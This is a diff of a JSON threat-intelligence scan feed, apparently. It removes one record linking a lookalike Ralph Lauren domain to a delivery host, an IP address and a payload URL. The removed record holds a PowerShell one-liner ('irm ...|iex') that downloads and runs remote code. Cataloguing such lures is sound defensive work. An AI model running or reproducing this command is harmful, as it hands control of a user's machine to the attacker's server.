@@ -6948,27 +6948,5 @@
     ],
     "ReportId": "cmwb3aant00gt0nmlmc5pa0pm",
     "ScannedAt": "2026-11-10T19:34:51.772000+00:00"
-  },
-  {
-    "UrlDomain": "ralphlauren-polo.com.co",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/20852d0346938afe",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/20852d0346938afe'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/20852d0346938afe"
-    ],
-    "ReportId": "cmwb2fd2s00g10nmllb1yc2q6",
-    "ScannedAt": "2026-11-10T19:10:48.567000+00:00"
   }
 ]
